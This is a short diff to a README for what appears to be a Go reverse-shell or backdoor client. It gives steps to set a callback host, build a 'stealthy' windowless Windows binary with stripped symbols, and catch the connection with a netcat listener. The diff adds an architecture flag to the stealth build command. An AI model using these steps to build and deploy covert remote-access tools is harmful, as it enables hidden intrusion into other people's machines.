@@ -5,7 +5,7 @@
 To use: 
 - Set the host address near the top to your server. `const host = "127.0.0.1:1234`
 - Build using `go build main.go`
-- Stealthy version `GOOS=windows go build -ldflags="-s -w -H=windowsgui" main.go` (Windows target, build from macos)
+- Stealthy version `GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" main.go` (Windows target, build from macos)
 - Start listening on the server using `netcat -l -p 8080`
 
 Example debug output
